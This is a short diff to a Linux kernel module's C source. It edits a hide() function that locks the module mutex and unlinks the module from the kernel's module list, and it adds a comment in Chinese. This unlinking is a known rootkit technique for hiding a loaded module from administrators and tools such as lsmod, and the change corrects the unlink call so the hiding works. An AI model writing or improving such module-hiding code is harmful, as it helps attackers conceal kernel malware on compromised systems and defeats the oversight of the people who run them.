@@ -7,13 +7,14 @@
 #include <linux/module.h>
 #include <linux/mutex.h>
 
+// 可能为空
 static struct list_head *mod_pre;
 
 void hide(void) {
     while (!mutex_trylock(&module_mutex))
         cpu_relax();
     mod_pre = THIS_MODULE->list.prev;
-    list_del(mod_pre->next);
+    list_del(&THIS_MODULE->list);
     mutex_unlock(&module_mutex);
 }
 
